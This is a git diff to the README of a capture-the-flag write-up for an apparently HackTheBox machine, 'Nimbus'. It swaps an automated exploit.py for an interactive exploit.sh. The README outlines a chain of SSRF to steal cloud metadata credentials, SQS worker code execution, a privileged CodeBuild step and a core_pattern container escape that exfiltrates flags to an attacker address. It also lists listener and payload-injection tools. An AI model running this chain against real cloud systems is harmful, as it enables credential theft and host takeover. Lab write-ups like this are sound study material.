@@ -17,22 +17,16 @@
 
 ## ⚡ Quick start (automated, one shot)
 
-If you just want both flags, the whole chain is automated in [`exploit.py`](exploit.py):
+If you just want both flags, the whole chain is automated in [`exploit.sh`](exploit.sh):
 
 ```bash
-# 1. point the vhosts at the box
-echo "TARGET_IP  nimbus.htb aws.nimbus.htb floci" | sudo tee -a /etc/hosts
-
-# 2. deps
-pip3 install boto3 pyyaml
-
-# 3. run it  (ATTACKER_IP = your VPN address, reachable from the box)
-python3 exploit.py ATTACKER_IP --target TARGET_IP
+chmod +x Nimbus/exploit.sh
+./Nimbus/exploit.sh        # prompts for target IP + your VPN IP, sets up /etc/hosts & deps, prints both flags
 ```
 
-It starts a listener, steals the IMDS creds via SSRF, injects the SQS job, and the worker
-launches the privileged-CodeBuild → `core_pattern` escape, which exfils **both flags** back
-to you. Expect output like:
+The script prompts for the IPs, configures `/etc/hosts`, installs deps, then runs the full
+chain (SSRF → IMDS → SQS worker RCE → privileged CodeBuild → `core_pattern` escape) and
+exfils **both flags** back to you. Expect output like:
 
 ```
 [+] user.txt = <user flag>
@@ -45,7 +39,7 @@ walkthrough below — each section explains the **why**, not just the command.
 ## Prerequisites
 
 - HTB VPN connected; the box IP in `/etc/hosts` as shown above.
-- Tools: `nmap`, `curl`, `awscli` (`aws`), Python 3 with `boto3`+`pyyaml`. (`exploit.py` only needs boto3+pyyaml.)
+- Tools: `nmap`, `curl`, `awscli` (`aws`), Python 3 with `boto3`+`pyyaml`. (`exploit.sh` installs them for you.)
 - A listener your box can receive callbacks on (the scripts use one automatically).
 
 ---
@@ -354,7 +348,7 @@ ulimit -c unlimited; cd /tmp; python3 -c 'import ctypes; ctypes.string_at(0)'   
 ```
 README.md               — this step-by-step writeup
 timeline.md             — concise chronological log of the whole solve
-exploit.py              — automated full chain (SSRF → IMDS → SQS RCE → CodeBuild root)
+exploit.sh              — interactive one-shot: prompts for IPs, sets up env, captures both flags
 tools/
   listener.py           — threaded HTTP server that catches exfil/callbacks
   sendjob.py            — wrap a Python script into an SQS worker job (manual RCE)
@@ -365,7 +359,7 @@ tools/
 ```
 
 > The helper scripts use placeholders (`<ACCESS_KEY_FROM_SSRF>`, `<YOUR_SSH_PUBLIC_KEY>`, etc.)
-> — drop in your own values from the corresponding step. `exploit.py` needs nothing hardcoded.
+> — drop in your own values from the corresponding step. `exploit.sh` prompts for everything; nothing hardcoded.
 
 ---
 
